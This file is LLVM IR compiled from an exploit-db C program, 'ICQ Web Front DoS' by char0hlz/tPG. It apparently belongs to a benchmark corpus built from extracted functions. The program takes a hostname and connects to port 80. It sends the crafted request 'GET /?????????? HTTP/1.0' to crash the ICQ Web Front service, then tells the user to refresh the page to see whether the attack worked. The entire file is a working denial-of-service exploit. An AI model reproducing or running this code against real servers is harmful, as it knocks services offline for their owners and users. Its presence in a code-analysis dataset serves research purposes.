; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/cgi/dos/extr_20071.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/cgi/dos/extr_20071.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.sockaddr_in = type { i32, i32, i32 }
%struct.hostent = type { i32, i32 }
%struct.sockaddr = type { i32 }

@__const.main.xploitstr1 = private unnamed_addr constant [50 x i8] c"GET /?????????? HTTP/1.0 \0A\0A\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 16
@.str = private unnamed_addr constant [42 x i8] c"ICQ Web Front DoS - author: char0hlz/tPG\0A\00", align 1
@.str.1 = private unnamed_addr constant [47 x i8] c"The Poor Gurus' Network [http://www.tpgn.net]\0A\00", align 1
@.str.2 = private unnamed_addr constant [22 x i8] c"usage: %s <hostname>\0A\00", align 1
@.str.3 = private unnamed_addr constant [14 x i8] c"gethostbyname\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [9 x i8] c"pr0blemz\00", align 1
@.str.5 = private unnamed_addr constant [45 x i8] c"Done. Refresh the page to see if it worked.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca %struct.in_addr, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca %struct.hostent*, align 8
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca i64, align 8
  %12 = alloca [50 x i8], align 16
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %13 = bitcast [50 x i8]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %13, i8* align 16 getelementptr inbounds ([50 x i8], [50 x i8]* @__const.main.xploitstr1, i32 0, i32 0), i64 50, i1 false)
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str, i64 0, i64 0))
  %15 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.1, i64 0, i64 0))
  %16 = load i32, i32* %3, align 4
  %17 = icmp slt i32 %16, 2
  br i1 %17, label %18, label %24

18:                                               ; preds = %2
  %19 = load i8**, i8*** %4, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.2, i64 0, i64 0), i8* %21)
  %23 = call i32 @exit(i32 0) #4
  unreachable

24:                                               ; preds = %2
  %25 = load i8**, i8*** %4, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 1
  %27 = load i8*, i8** %26, align 8
  %28 = call %struct.hostent* @gethostbyname(i8* %27)
  store %struct.hostent* %28, %struct.hostent** %8, align 8
  %29 = icmp eq %struct.hostent* %28, null
  br i1 %29, label %30, label %33

30:                                               ; preds = %24
  %31 = call i32 @herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.3, i64 0, i64 0))
  %32 = call i32 @exit(i32 0) #4
  unreachable

33:                                               ; preds = %24
  %34 = load i8**, i8*** %4, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 1
  %36 = load i8*, i8** %35, align 8
  %37 = call i64 @inet_addr(i8* %36)
  store i64 %37, i64* %9, align 8
  %38 = load i64, i64* %9, align 8
  %39 = call i64 @ntohl(i64 %38)
  store i64 %39, i64* %11, align 8
  %40 = load i32, i32* @AF_INET, align 4
  %41 = load i32, i32* @SOCK_STREAM, align 4
  %42 = call i32 @socket(i32 %40, i32 %41, i32 0)
  store i32 %42, i32* %5, align 4
  %43 = load %struct.hostent*, %struct.hostent** %8, align 8
  %44 = getelementptr inbounds %struct.hostent, %struct.hostent* %43, i32 0, i32 1
  %45 = load i32, i32* %44, align 4
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %47 = bitcast i32* %46 to i8*
  %48 = load %struct.hostent*, %struct.hostent** %8, align 8
  %49 = getelementptr inbounds %struct.hostent, %struct.hostent* %48, i32 0, i32 0
  %50 = load i32, i32* %49, align 4
  %51 = call i32 @bcopy(i32 %45, i8* %47, i32 %50)
  %52 = load i32, i32* @AF_INET, align 4
  %53 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i32 %52, i32* %53, align 4
  %54 = call i32 @htons(i32 80)
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i32 %54, i32* %55, align 4
  %56 = load i32, i32* %5, align 4
  %57 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %58 = call i64 @connect(i32 %56, %struct.sockaddr* %57, i32 12)
  %59 = icmp ne i64 %58, 0
  br i1 %59, label %60, label %62

60:                                               ; preds = %33
  %61 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0))
  br label %62

62:                                               ; preds = %60, %33
  %63 = load i32, i32* %5, align 4
  %64 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %65 = getelementptr inbounds [50 x i8], [50 x i8]* %12, i64 0, i64 0
  %66 = call i32 @strlen(i8* %65)
  %67 = call i32 @send(i32 %63, i8* %64, i32 %66, i32 0)
  %68 = load i32, i32* %5, align 4
  %69 = call i32 @close(i32 %68)
  %70 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.5, i64 0, i64 0))
  ret void
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local %struct.hostent* @gethostbyname(i8*) #2

declare dso_local i32 @herror(i8*) #2

declare dso_local i64 @inet_addr(i8*) #2

declare dso_local i64 @ntohl(i64) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @bcopy(i32, i8*, i32) #2

declare dso_local i32 @htons(i32) #2

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local i32 @send(i32, i8*, i32, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @close(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
